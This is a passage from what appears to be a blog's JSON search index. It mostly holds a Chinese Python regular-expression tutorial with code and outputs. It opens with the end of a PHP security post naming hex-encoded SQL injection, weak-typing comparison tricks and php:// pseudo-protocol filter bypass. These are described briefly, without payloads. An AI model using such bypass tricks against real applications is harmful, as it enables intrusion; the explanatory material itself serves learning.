1&#39;转换为16进制形式，再传参，就可以造成sql注入 switch()当switch()没有break时可以继续往下执行这里也有自动转换，比如$a = a,会当0执行，$a=1a，会当1执行…… NULL,0,”0″,array()使用==和false比较时，都会返回true123456789101112131415&lt;?php$a = NULL;$b = 0;$c = &quot;0&quot;;$d = array();// 以下是三元运算符echo $a == false ? &#x27;True&#x27;: &#x27;False&#x27;;echo &#x27;&lt;hr&gt;&#x27;;echo $b == false ? &#x27;True&#x27;: &#x27;False&#x27;;echo &#x27;&lt;hr&gt;&#x27;;echo $b == false ? &#x27;True&#x27;: &#x27;False&#x27;;echo &#x27;&lt;hr&gt;&#x27;;echo $b == false ? &#x27;True&#x27;: &#x27;False&#x27;;?&gt; php://伪协议绕过接收参数中不能出现某一字符，但下面又必须使用可以php://伪协议绕过 目前遇到的是file_get_contents(),其他情况具体而定 array_search() 用到了PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比","categories":[{"name":"PHP","slug":"PHP","permalink":"https://taonn.github.io/categories/PHP/"}],"tags":[{"name":"php安全","slug":"php安全","permalink":"https://taonn.github.io/tags/php%E5%AE%89%E5%85%A8/"}]},{"title":"Python正则表达式(入门到进阶)","slug":"Python正则表达式-入门到进阶","date":"2020-10-04T01:13:16.000Z","updated":"2021-03-16T05:27:20.805Z","comments":true,"path":"2020/10/04/Python正则表达式-入门到进阶/","link":"","permalink":"https://taonn.github.io/2020/10/04/Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F-%E5%85%A5%E9%97%A8%E5%88%B0%E8%BF%9B%E9%98%B6/","excerpt":"","text":"Python-&gt;re 之前想着玩爬虫，特意找一些大佬的文章学的，使用jupyter notebook写的,以下是导出成markdown语法形成的样子，一些更细节的解释，可以参看文末大佬总结的文章。 12345678910111213141516171819202122232425262728293031323334import restr1 = &quot;&lt;table&gt;&lt;tr&gt;hello world 18111234589&lt;tr&gt;&lt;tr&gt;&lt;span&gt;name:张三,tel:18711001111&lt;/span&gt;&lt;/tr&gt;&lt;/table&gt;&quot;&#x27;&#x27;&#x27;需求：1.提取字符串中&lt;span&gt;标签里的内容；2.提取其中所有的手机号；&#x27;&#x27;&#x27;#第一题:start = str1.find(&#x27;&lt;span&gt;&#x27;)end = str1.rfind(&#x27;&lt;/span&gt;&#x27;)if start != -1: print(str1[start+len(&#x27;&lt;span&gt;&#x27;):end])#第一题 获取&lt;span&gt;标签内的所有数据info = re.search(r&#x27;(?&lt;=&lt;span&gt;).*(?=&lt;/span&gt;)&#x27;,str1)print(info.group(0))#输出：name:张三,tel:18711001111#第二题:&#x27;&#x27;&#x27;提取手机号：（必须先清楚手机号的规则） 1.必须是11位的数字 2.第一位数字以1开头，第二位数字可以是[3,4,5,7,8]中的任意一个后面9个是[0-9]中的任意一个数字 （现在规则更多了，出现了19**的号码，这里作为例子就简单一点）；&#x27;&#x27;&#x27;#第二题 提取所有手机号：phone = re.findall(r&#x27;1[345678]\\d&#123;9&#125;&#x27;,str1)print(phone)#输出：[&#x27;18111234589&#x27;, &#x27;18711001111&#x27;] name:张三,tel:18711001111 name:张三,tel:18711001111 [&#39;18111234589&#39;, &#39;18711001111&#39;] 1234567891011121314151617&#x27;&#x27;&#x27;使用正则表达式有两个常见的原因: 第一个原因是数据挖掘——也就是说，当我们希望在一大堆文本中找到一小堆文本，例如：身份证，手机号，e-mail等； 第二个原因是验证，可以使用正则表达式确认获得的数据是你所期望的，如用户验证，密码长度和格式的验证；re 模块&#x27;&#x27;&#x27;#首先我们学习第一个函数，search()函数，它的目的是接收一个正则表达式和一个字符串，并返回发现的第一个匹配的字符串a = re.search(r&#x27;fox&#x27;,&#x27;the quick brown fox jumpred&#x27;)#第一个参数为正则表达式，第二个参数为要处理的字符串print(a.span()) #span方法获取的是正则表达式匹配到的位置,输出&#x27;(16,19)&#x27;b = re.search(r&#x27;www&#x27;,&#x27;the quick brown fox jumpred&#x27;)print(b) #输出None (16, 19) None 1234567891011121314#找到多个匹配&#x27;&#x27;&#x27;re.search 的一个限制是它仅仅返回最近一个以 match 对象形式的匹配，如果在一个字符串内存在多个匹配，re.search()只会返回第一个匹配，一般情况下这也是我们期望的结果，但是，有时候需要当多个匹配存在时进行多个匹配。如果有这种需求咱们可以使用 findall 或者 finditer。两个方法的区别在于 findall 返回的是一个列表，finditer返回的是一个生成器&#x27;&#x27;&#x27;l = re.findall(r&#x27;张&#x27;,&#x27;张三 张三丰 张无忌 张小凡&#x27;)print(l)#在这个例子中，我们会发现findall返回了所有匹配的值，这是因为“张”字在后面的字符串中出现了4次 [&#39;张&#39;, &#39;张&#39;, &#39;张&#39;, &#39;张&#39;] 123456789101112131415#基础正则表达式&#x27;&#x27;&#x27;最简单的正则表达式是哪些仅包含简单字母数字字符的表达式——不包含任何其他字符。字符串Python是一个有效的正则表达式，它仅匹配单词，默认正则表达式区分大小写，例如：&#x27;&#x27;&#x27;a = re.search(r&#x27;Python&#x27;,&#x27;I Like python&#x27;)print(a)b = re.search(r&#x27;Python&#x27;,&#x27;I LIKE PYTHON&#x27;)print(b)&#x27;&#x27;&#x27;不过如果只是使用正则表达式来匹配文本，没有什么实际的意义，毕竟检测一个文本中是否有另一个字符串本来就非常简单。正则表达式强大的地方在于能够指定用于匹配的文本模式。&#x27;&#x27;&#x27; None None 12345a = re.findall(r&#x27;[Pp]ython&#x27;,&#x27;I Like Python3 and I like python2.7&#x27;)print(a)#可以发现[Pp]既可以匹配大写的P也可以匹配小写的p#执行会发现输出为空数组，这里值的我们注意的是[Pp]仅匹配一个字符 [&#39;Python&#39;, &#39;python&#39;] 123456789101112131415161718192021#区间&#x27;&#x27;&#x27;有一些常见的字符组非常大，比如，我们要匹配的是任意数字，如果依照上述代码，每次我们都需要使用[0123456789] 这种方式明显很不明智，而如果要匹配从a-z的字母，我们也这样编写代码的话，肯定会让我们崩溃为了适应这一点，正则表达式引擎在字符组中使用连字符(-)代表区间，所以我们匹配任意数字可以使用[0-9]，所以如果我们想要匹配所有小写字母，可以写成[a-z]，想要匹配所有大写字母可以写成[A-Z]可能我们还有个需求：匹配连字符。因为-在会被正则表达式引擎理解为代表连接区间，所以这个时候我们需要对-进行转义&#x27;&#x27;&#x27;a = re.findall(r&#x27;[0-9]&#x27;,&#x27;xxx007abc&#x27;)b = re.findall(r&#x27;[a-z]&#x27;,&#x27;abc001ABC&#x27;)c = re.findall(r&#x27;[A-Za-z0-9]&#x27;,&#x27;abc007ABC&#x27;)d = re.findall(r&#x27;[0-9\\-]&#x27;,&#x27;0edu 007-edu&#x27;)print(a)print(b)print(c)print(d) [&#39;0&#39;, &#39;0&#39;, &#39;7&#39;] [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;] [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;0&#39;, &#39;0&#39;, &#39;7&#39;, &#39;A&#39;, &#39;B&#39;, &#39;C&#39;] [&#39;0&#39;, &#39;0&#39;, &#39;0&#39;, &#39;7&#39;, &#39;-&#39;] 123456789101112131415161718192021#取反a = re.findall(r&#x27;[^0-9]&#x27;,&#x27;xxx007abc&#x27;)b = re.search(r&#x27;[^0-9]&#x27;,&#x27;xxx007abc&#x27;)print(a)print(b)#可以通过在字符数组开头使用^字符实现取反操作，从而可以反转一个字符组（意味着会匹配任何指定字符之外的所有字符）&#x27;&#x27;&#x27;接下来在看一个表达式：n[^e] 这意味着字符n接下来的字符是除了e之外所有的字符&#x27;&#x27;&#x27;a = re.findall(r&#x27;n[^e]&#x27;,&#x27;final&#x27;)b = re.search(r&#x27;n[^e]&#x27;,&#x27;final&#x27;)c = re.findall(r&#x27;[n[^e]]&#x27;,&#x27;Python&#x27;)print(a)print(b)print(c)&#x27;&#x27;&#x27;这里我们可以发现a和b匹配的是na，字符a因为不是e所以可以被匹配，而变量c的值为空，在这里正则表达式引擎只匹配到了字符串n的位置，而n之后没有任何可以匹配[^e]的字符了，所以这里也匹配失败&#x27;&#x27;&#x27; [&#39;x&#39;, &#39;x&#39;, &#39;x&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;] &lt;re.Match object; span=(0, 1), match=&#39;x&#39;&gt; [&#39;na&#39;] &lt;re.Match object; span=(2, 4), match=&#39;na&#39;&gt; [] 123456789101112131415161718192021222324252627282930313233#快捷方式&#x27;&#x27;&#x27;几种普通字符组还在正则表达式引擎中有几个预定义的快捷方式，如果我们想要定义单词，以目前学到的可能会使用[A-Za-z]，但是，很多单词都是使用该巨剑以外的字符。比如中文，以及其他语言，正则表达式引擎提供了一些快捷方式：w ，与 “任意单词字符”匹配，在Python3中，基本上可以匹配任何语言的任意单词。而当我们想要匹配任意数字的时候也可以使用快捷方式 \\d d即digit，在Python3中它除了可以和[0-9]匹配，还可以和其他语言的数字匹配。\\s快捷方式匹配空白字符，比如空格，tab、换行 等。\\b 快捷方式匹配一个长度为0的字符串，但是，他仅仅在一个单词开始或结尾处匹配，这被称为词边界快捷方式快捷方式 描述w 与任意单词匹配d 与任意数字匹配s 匹配空白字符，比如空格 tab 换行 等b 匹配一个长度为0的子串 #空字符&#x27;&#x27;&#x27;#示例：a = re.findall(r&#x27;\\w&#x27;,&#x27;学好Python 大展拳脚&#x27;) #任意单词匹配b = re.search(r&#x27;\\w&#x27;,&#x27;python3&#x27;) c = re.search(r&#x27;\\d&#x27;,&#x27;编号89757&#x27;)print(a)print(b)print(c)#这里findall会返回所有能匹配的值，search只会返回第一个匹配到的值d = re.findall(r&#x27;\\bmaster\\b&#x27;,&#x27;masterxiao-master-xxx master abc&#x27;)e = re.search(r&#x27;\\smaster\\s&#x27;,&#x27;masterxiao master xxxx&#x27;)print(d)print(e) [&#39;学&#39;, &#39;好&#39;, &#39;P&#39;, &#39;y&#39;, &#39;t&#39;, &#39;h&#39;, &#39;o&#39;, &#39;n&#39;, &#39;大&#39;, &#39;展&#39;, &#39;拳&#39;, &#39;脚&#39;] &lt;re.Match object; span=(0, 1), match=&#39;p&#39;&gt; &lt;re.Match object; span=(2, 3), match=&#39;8&#39;&gt; [&#39;master&#39;, &#39;master&#39;] &lt;re.Match object; span=(10, 18), match=&#39; master &#39;&gt; 1234567891011121314151617#快捷方式取反&#x27;&#x27;&#x27;之前提到了取反，快捷方式也可以取反， 例如对于 \\w的取反为\\W，可以发现将小写改写成大写即可。注意这里\\B 有所不同， b 匹配的是在单词开始或结束位置长度为0的子字符串，而\\B匹配不在单词开始和结束位置的长度为0的子字符串&#x27;&#x27;&#x27;a = re.findall(r&#x27;\\Bmaster\\B&#x27;,&#x27;masterxiao master xxx master abc&#x27;)b = re.search(r&#x27;master\\B&#x27;,&#x27;masterxiao&#x27;)c = re.findall(r&#x27;\\Bmaster\\B&#x27;,&#x27;1master1&#x27;)print(a)print(b)print(c) [] &lt;re.Match object; span=(0, 6), match=&#39;master&#39;&gt; [&#39;master&#39;] 1234567891011121314#字符串的开始和结束a = re.search(r&#x27;^python&#x27;,&#x27;this code in python3&#x27;)b = re.search(r&#x27;python$&#x27;,&#x27;this code in python3&#x27;)c = re.search(r&#x27;^python&#x27;,&#x27;python is my favorite&#x27;)d = re.search(r&#x27;python$&#x27;,&#x27;this is code in python&#x27;)print(a)print(b)print(c)print(d)#通过上述例子，我们可以发现 ^指定的是一个字符串的开始，$指定的是一个字符串的结束 None None &lt;re.Match object; span=(0, 6), match=&#39;python&#39;&gt; &lt;re.Match object; span=(16, 22), match=&#39;python&#39;&gt; 12345678910111213#任意字符import re&#x27;&#x27;&#x27;.字符最后一个快捷方式字符，它代表匹配任何单个字符，不过值得注意的是，它只能出现在方括号字符组以外值得注意的是：&lt;font color = &quot;red&quot;&gt;.字符只有一个不能匹配的字符，也就是换行（\\n），&lt;/font&gt;，不过让.字符与换行符匹配也是可能的，以后会讨论&#x27;&#x27;&#x27;a = re.search(r&#x27;p.th.n&#x27;,&#x27;hello python re&#x27;)b = re.search(r&#x27;p.....&#x27;,&#x27;学好 python 人见人爱&#x27;)print(a)print(b) &lt;re.Match object; span=(6, 12), match=&#39;python&#39;&gt; &lt;re.Match object; span=(3, 9), match=&#39;python&#39;&gt; 1234567891011121314151617181920# 可选字符&#x27;&#x27;&#x27;到目前为止，我们看到的正则表达式都是在正则表达式中的字符与被搜索的字符串中的字符保持1:1的关系。不过有时，我们可能想要匹配一个单词的不同写法，比如“color”和“colour”，或者“honor”与“honour”。这个时候我们可以使用 ? 符号指定一个字符、字符组或其他基本单元可选，这意味着正则表达式引擎将会期望该字符出现零次或一次&#x27;&#x27;&#x27;a = re.search(r&#x27;honou?r&#x27;,&#x27;He Served with honor and distinction&#x27;)b = re.search(r&#x27;honou?r&#x27;,&#x27;He Served with honour and distinction&#x27;)c = re.search(r&#x27;honou?r&#x27;,&#x27;He Served with honou and distinction&#x27;)print(a)print(b)print(c)&#x27;&#x27;&#x27;可以发现，在上述三个例子中，正则表达式为honou?r，这里可以匹配的是 honor 和 honour 不能匹配 honou，可以知道的是 ? 确定了前一个u是可选的，在第一个示例中，没有u，是没有问题可以匹配的，在第二个示例中，u存在这也没有问题。在第三个例子中，u存在但是r不存在，这样就不能匹配了&#x27;&#x27;&#x27; &lt;re.Match object; span=(15, 20), match=&#39;honor&#39;&gt; &lt;re.Match object; span=(15, 21), match=&#39;honour&#39;&gt; None 123456789# 重复&#x27;&#x27;&#x27;到目前为止，我们只是学习了关于仅出现一次的字符串匹配，在实际开发过程中，这样肯定不能满足需求，比如要匹配电话号码，比如匹配身份证号，这些都是很多个数字组成的。如果遇到这样的情况，我们可能期望一个字符组连续匹配好几次。在正则表达式在一个字符组后加上&#123;N&#125; 就可以表示 &#123;N&#125; 之前的字符组出现N次&#x27;&#x27;&#x27;re.findall(r&#x27;[\\d]&#123;4&#125;-[\\d]&#123;7&#125;&#x27;,&#x27;张三：0731-8825951，李四：0733-8794561&#x27;) [&#39;0731-8825951&#39;, &#39;0733-8794561&#39;] 12345678910111213141516171819202122#重复区间&#x27;&#x27;&#x27;可能有时候，我们不知道具体要匹配字符组要重复的次数，比如身份证有15位也有18位的。这里重复区间就可以出场了，语法：&#123;M,N&#125;，M是下界而N是上界举个例子：&#x27;&#x27;&#x27;a = re.search(r&#x27;[\\d]&#123;3,4&#125;&#x27;,&#x27;0731&#x27;)b = re.search(r&#x27;[\\d]&#123;3,4&#125;&#x27;,&#x27;073&#x27;)print(a)print(b)&#x27;&#x27;&#x27;通过上述代码，我们发现[\\d]&#123;3,4&#125; 既可以匹配3个数字也可以匹配4个数字，不过当有4个数字的时候，优先匹配的是4个数字，这是因为正则表达式默认是贪婪模式，即尽可能的匹配更多字符，而要使用非贪婪模式，我们要在表达式后面加上 ?号&#x27;&#x27;&#x27;d = re.search(r&#x27;[\\d]&#123;3,4&#125;?&#x27;,&#x27;0734&#x27;)e = re.search(r&#x27;[\\d]&#123;2,3&#125;?&#x27;,&#x27;073&#x27;)print(d)print(e) &lt;re.Match object; span=(0, 4), match=&#39;0731&#39;&gt; &lt;re.Match object; span=(0, 3), match=&#39;073&#39;&gt; &lt;re.Match object; span=(0, 3), match=&#39;073&#39;&gt; &lt;re.Match object; span=(0, 2), match=&#39;07&#39;&gt; 12345#开闭区间#有时候我们可能遇到字符组的重复次数没有边界：#闭区间不写即可表示匹配一个或多个。a = re.search(r&#x27;[\\d]&#123;1,&#125;&#x27;,&#x27;0731 xxx&#x27;)print(a) &lt;re.Match object; span=(0, 4), match=&#39;0731&#39;&gt; 12345678#速写#还可以使用两个速写字符指定常见的重复情况，#可以使用 + 匹配1个或多个，#使用 *代表0个或多个a = re.findall(r&#x27;[\\d]+&#x27;,&#x27;0731-8859456&#x27;)b = re.findall(r&#x27;[\\d]*&#x27;,&#x27;编号89758&#x27;)print(a)print(b) [&#39;0731&#39;, &#39;8859456&#39;] [&#39;&#39;, &#39;&#39;, &#39;89758&#39;, &#39;&#39;] 1234567891011#分组&#x27;&#x27;&#x27;在Python正则中还提供了一种机制将表达式——分组，当使用分组时，除了获得整个匹配。还能够在匹配中选择每一个分组。要实现分组很简单，使用()即可。&#x27;&#x27;&#x27;a = re.search(r&#x27;([\\d]&#123;4&#125;)-([\\d]&#123;7&#125;)&#x27;,&#x27;张三：0731-8825951&#x27;) #未使用分组print(a.group())print(a.groups())print(a.group(1))print(a.group(2)) 0731-8825951 (&#39;0731&#39;, &#39;8825951&#39;) 0731 8825951 1234567891011#练习 识别中国电话号码#中国区号码规则如下： (+)86-0XX（0XXX）-XXX-XXXX（XXXX-XXXX）phone=&#x27;&#x27;&#x27;+86-010-8286693186010-82866931010 8286 693186(010)-6967521786(0731)-728-3333(0731)-2728-3353&#x27;&#x27;&#x27;#请你使用正则表达式将这些号码提取成分组形式 1234567891011121314151617181920212223242526272829303132333435363738394041#命名分组#一个命名分组的语法是在开始的“(”之后，添加?P&lt;group_name&gt;，来实现分组，例如：import rea = re.search(r&#x27;[\\d]&#123;4&#125;-[\\d]&#123;7&#125;&#x27;,&#x27;张三：0731-8825951&#x27;)b = re.search(r&#x27;(?P&lt;first_group&gt;[\\d]&#123;4&#125;)-(?P&lt;second_group&gt;[\\d]&#123;7&#125;)&#x27;,&#x27;张三：0731-8825951&#x27;)print(a)print(a.group)print(a.groups)print(&quot; -&quot;*30)print(b)print(b.group())print(b.groups())print(b.group(0))print(b.group(1))print(b.group(2))print(&quot; -&quot;*30)print(b.group(&#x27;first_group&#x27;))print(b.group(&#x27;second_group&#x27;))print(b.groupdict())&#x27;&#x27;&#x27;re.search()方法返回的是一个re.Match对象，运行上述例子我们可以发现，使用 ?P&lt;group_name&gt; 可以实现分组， 使用 .group(group_name)将分组名传入group()函数可以获取对应名称分组的数据，同样使用索引 也是可以获取对应分组的数据的。Match对象还提供了一个groupdict()方法，该方法在和groups()方法类似，不过它返回的是一个字典，而groups()放回的是一个元祖。不过值得注意的是：groupdict()只会返回命名分组而不会返回非命名分组&#x27;&#x27;&#x27;match = re.search(r&#x27;(?P&lt;first_group&gt;[\\d]&#123;4&#125;)-([\\d]&#123;7&#125;)&#x27;,&#x27;张三：0731-8825951&#x27;) #使用分组print(match.group())print(match.groups())print(match.groupdict())&quot;&quot;&quot;在上述例子中，只有第一个是命名分组，第二个是编码分组，所以当调用groups()时，这两个分组都在元祖中返回，但是，当调用groupdict时，这两个分组则只有命名分组被返回了，如果从可维护的角度来说，命名分组十分有价值&quot;&quot;&quot; &lt;re.Match object; span=(3, 15), match=&#39;0731-8825951&#39;&gt; &lt;built-in method group of re.Match object at 0x0000016EDCFF0B90&gt; &lt;built-in method groups of re.Match object at 0x0000016EDCFF0B90&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &lt;re.Match object; span=(3, 15), match=&#39;0731-8825951&#39;&gt; 0731-8825951 (&#39;0731&#39;, &#39;8825951&#39;) 0731-8825951 0731 8825951 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 0731 8825951 &#123;&#39;first_group&#39;: &#39;0731&#39;, &#39;second_group&#39;: &#39;8825951&#39;&#125; 0731-8825951 (&#39;0731&#39;, &#39;8825951&#39;) &#123;&#39;first_group&#39;: &#39;0731&#39;&#125; &#39;\\n在上述例子中，只有第一个是命名分组，第二个是编码分组，所以当调用groups()时，\\n这两个分组都在元祖中返回，但是，当调用groupdict时，这两个分组则只有命名分组被返回了，\\n如果从可维护的角度来说，命名分组十分有价值\\n\\n&#39; 1234567891011121314151617181920212223242526272829# 引用已经存在的分组&#x27;&#x27;&#x27;正则表达式还提供了一种引用一个之前匹配分组的机制，有些时候，我们或许会寻找到一个子匹配，该匹配会接下来再次出现。例如，如果我们尝试解析一段XML代码，比如：&lt;font&gt;提示&lt;/font&gt;，我们可能会编写出这样一段代码：&#x27;&#x27;&#x27;a = re.search(r&#x27;&lt;[\\w_-]+&gt;提示&lt;/[\\w_-]+&gt;&#x27;,&#x27;&lt;font&gt;提示&lt;/font&gt;&#x27;)print(a)#上述代码确实可以匹配，不过也存在另一种情况，如果解析的是如下数据：&lt;font&gt;提示&lt;/bar&gt;b = re.search(r&#x27;&lt;([\\w_-]+)&gt;提示&lt;(/[\\w_-]+)&gt;&#x27;,&#x27;&lt;font&gt;提示&lt;/bar&gt;&#x27;)print(b)print(b.group(1))print(b.group(2))print(&quot; -&quot;*30)#这个时候我们可能直觉的想让后面分组的正则也匹配font，不过实际情况确是，#所有形式的都会匹配，那如果我们想让后面的正则和第一个分组的正则该如何做呢？#可以使用分组引用，使用\\N即可回溯引用编号为N的分组，因此上述例子的代码我们可以改为：a = re.search(r&#x27;&lt;([\\w_-]+)&gt;提示&lt;/\\1&gt;&#x27;,&#x27;&lt;font&gt;提示&lt;/bar&gt;&#x27;)b = re.search(r&#x27;&lt;([\\w_-]+)&gt;提示&lt;/\\1&gt;&#x27;,&#x27;&lt;font&gt;提示&lt;/font&gt;&#x27;)print(a)print(b.group())print(b.groups())#通过上面的例子，我们可以发现回溯引用取代了第二个分组。所以与font不同的就无法匹配了；#值的注意的是：这里只是一个作为介绍回溯引用的例子，#在实际开发中我们不应该用这种方式去解析XML文档，可以使用beautifulSoap等包去解析XML文件 &lt;re.Match object; span=(0, 15), match=&#39;&lt;font&gt;提示&lt;/font&gt;&#39;&gt; &lt;re.Match object; span=(0, 14), match=&#39;&lt;font&gt;提示&lt;/bar&gt;&#39;&gt; font /bar - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - None &lt;font&gt;提示&lt;/font&gt; (&#39;font&#39;,) 12345678910111213#先行断言a = re.findall(r&#x27;n(?!e)&#x27;,&#x27;final&#x27;)b = re.findall(r&#x27;n(?!e)&#x27;,&#x27;python&#x27;)print(a)print(b)print(&quot; -&quot; * 30)#正向先行断言c = re.findall(r&#x27;n(?=e)&#x27;,&#x27;final&#x27;)d = re.findall(r&#x27;n(?=e)&#x27;,&#x27;python&#x27;)e = re.findall(r&#x27;n(?=e)&#x27;,&#x27;jasmine&#x27;)print(c)print(d)print(e) [&#39;n&#39;] [&#39;n&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [] [] [&#39;n&#39;] 123456789101112131415161718192021222324252627282930313233343536#标记，不区分大小写#最简单直接的标记是 re.IGNORECASE，他会导致正则表达式变为不区分大小写a = re.search(r&#x27;python&#x27;,&#x27;I LIKE PYTHON&#x27;,re.IGNORECASE)b = re.search(r&#x27;python&#x27;,&#x27;I LIKE PYTHON&#x27;,re.I)print(a)print(b)print(&quot; -&quot; * 30)#点匹配换行符#re.DOTALL标记（别名为re.S）可以让 .字符除了匹配其他字符之外，还匹配换行符。a = re.search(r&#x27;.+&#x27;,&#x27;hello\\nworld&#x27;)b = re.search(r&#x27;.+&#x27;,&#x27;hello\\nworld&#x27;,re.S)c = re.search(r&#x27;.+&#x27;,&#x27;hello\\nworld&#x27;,re.DOTALL)print(a)print(b)print(c)#详细模式&#x27;&#x27;&#x27;re.VERBOSE标记(别名为re.X)允许复杂的正则表达式以更容易的方式表示该标记做两件事，首先，他导致所有的空白（除了字符组中）被忽略，包括换行符。其次，它将#字符（同样，除非在字符组内）当做注释字符&#x27;&#x27;&#x27;#调试模式#re.DEBUG 标记（没有别名）在编译正则表达式时将一些调试信息输出到sys.stderr&#x27;&#x27;&#x27;使用多个标记可能我们还需要同时使用多个标记，为了完成这点，可以使用|操作符。正确的语法是例如：re.DOTALL|re.MULTILINE 或 re.S | re.M&#x27;&#x27;&#x27;#内联标记print(&quot; -&quot; * 30)f = re.search(&#x27;(?i)Foo&#x27;,&#x27;foo&#x27;)print(f)#可以发现这里的(?i)，就等同于使用re.IGNORECASE 标记。 &lt;re.Match object; span=(7, 13), match=&#39;PYTHON&#39;&gt; &lt;re.Match object; span=(7, 13), match=&#39;PYTHON&#39;&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &lt;re.Match object; span=(0, 5), match=&#39;hello&#39;&gt; &lt;re.Match object; span=(0, 11), match=&#39;hello\\nworld&#39;&gt; &lt;re.Match object; span=(0, 11), match=&#39;hello\\nworld&#39;&gt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &lt;re.Match object; span=(0, 3), match=&#39;foo&#39;&gt; 12345678910111213141516171819202122232425#替换&#x27;&#x27;&#x27;正则表达式引擎并不仅仅局限于识别一个模式是否在字符串中存在，它还能够执行字符串替换，基于在原始字符串中的分组返回一个新字符串。Python中的替换方法是re.sub，他接收三个参数，正则表达式，用于替换的字符串，被搜索的字符串。只要实际匹配被替换，如果没有匹配，则re.sub最终不执行任何操作。re.sub允许从被替换的字符串中的正则表达式模式使用同样的回溯引用，接下来我们看一个从电话号码中剥离无关格式数据的任务&#x27;&#x27;&#x27;a = re.sub(r&#x27;[\\d]+&#x27;,r&#x27;a&#x27;,&#x27;213-667-8890&#x27;)print(a)# 还可以利用sub的功能使所有的电话号码格式一致b = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;213-667-8890&#x27;)c = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;(213)8675509&#x27;)d = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;213.867.5509&#x27;)e = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;+1-213-854-5557&#x27;)f = re.sub(r&#x27;(\\+?1?)[ .-]?\\(?([\\d]&#123;3&#125;)\\)?[ .-]?([\\d]&#123;3&#125;)[ .-]?([\\d]&#123;4&#125;)&#x27;,r&#x27;(\\2)\\3-\\4&#x27;,&#x27;1213-854-5557&#x27;)print(b)print(c)print(d)print(e)print(f) a-a-a (213)667-8890 (213)867-5509 (213)867-5509 (213)854-5557 (213)854-5557 123456789101112131415161718192021222324#已编译的正则表达式#re模块包含一个函数：compile，它返回一个已编译的正则表达式对象，该对象之后可以被复用regex = re.compile(r&#x27;[\\d]&#123;3,4&#125;&#x27;)a = regex.search(&#x27;578&#x27;)b = regex.search(&#x27;编号8975&#x27;)print(a)print(b)&#x27;&#x27;&#x27;使用已编译的正则表达式有两个好处： 可用于作为方法的参数被传递 允许使用在re.search允许使用在re.search中不可用的两个额外参数， 这两个参数分别是被搜索字符串的开始和结束位置，他们可用来减少对部分字符串的考虑&#x27;&#x27;&#x27;reg = re.compile(&#x27;[\\d]+&#x27;)c = reg.search(&#x27;1 编号89757,wuhhhhh&#x27;)d = reg.search(&#x27;1 编号89757,wuhhhhh&#x27;,pos=2)#pos：匹配的起始位置，可选，默认为0#endpos：匹配的结束位置，可选，默认为 len(string)print(c)print(d) &lt;re.Match object; span=(0, 3), match=&#39;578&#39;&gt; &lt;re.Match object; span=(2, 6), match=&#39;8975&#39;&gt; &lt;re.Match object; span=(0, 1), match=&#39;1&#39;&gt; &lt;re.Match object; span=(4, 9), match=&#39;89757&#39;&gt; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#正则表达式练习str=&#x27;&#x27;&#x27;张伟 86-14870293148 \\n 王伟 +86-13285654569 \\n 王芳 15856529115 \\n 李伟 13022816340 \\n 王秀英 (86)14785720656 \\n 李秀英 17201444672 \\n 李娜 15682812452 \\n 张秀英 14326967740 \\n 刘伟 15146435743 \\n 张敏 (86)-17712576838 \\n 李静 86 14295083635 \\n 张丽 (+86) 13722348123 \\n 王静 17587918887 \\n 王丽 15493106739 \\n 李强 13786842977 \\n 张静 86-15542304386 \\n 李敏 15642387356 \\n 王敏 18627216756 \\n 王磊 17206185726 \\n 李军 17857426238 \\n 刘洋 17345352790 \\n&#x27;&#x27;&#x27;#要求：# 1.提取所有 11 位数字电话号码# 2.提取所有 18 或 13 开头的电话号码# 3.提取所有“王”姓同学的名字# 4.提取所有“张”姓同学的电话号码# 5.重新排版，排版成统一的格式，去掉国家区号。#1a = re.findall(r&#x27;[\\d]&#123;11&#125;&#x27;,str)#for i in a:# print(i)print(a)print(&quot; -&quot; * 30)#2b = re.findall(r&#x27;1[3|8][\\d]&#123;9&#125;&#x27;,str)print(b)print(&quot; -&quot; * 30)#3c = re.findall(r&#x27;王\\S*&#x27;,str)sprint(c)print(&quot; -&quot; * 30)#4d = re.findall(r&#x27;(张\\S*)\\s+\\(?(\\+?86?)?\\)?[ .-]?([\\d]&#123;11&#125;)&#x27;,str)for line in d: print(line[0]+&quot;的电话是：&quot;+line[2]) [&#39;14870293148&#39;, &#39;13285654569&#39;, &#39;15856529115&#39;, &#39;13022816340&#39;, &#39;14785720656&#39;, &#39;17201444672&#39;, &#39;15682812452&#39;, &#39;14326967740&#39;, &#39;15146435743&#39;, &#39;17712576838&#39;, &#39;14295083635&#39;, &#39;13722348123&#39;, &#39;17587918887&#39;, &#39;15493106739&#39;, &#39;13786842977&#39;, &#39;15542304386&#39;, &#39;15642387356&#39;, &#39;18627216756&#39;, &#39;17206185726&#39;, &#39;17857426238&#39;, &#39;17345352790&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [&#39;13285654569&#39;, &#39;13022816340&#39;, &#39;13722348123&#39;, &#39;13786842977&#39;, &#39;18627216756&#39;] - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - [&#39;王伟&#39;, 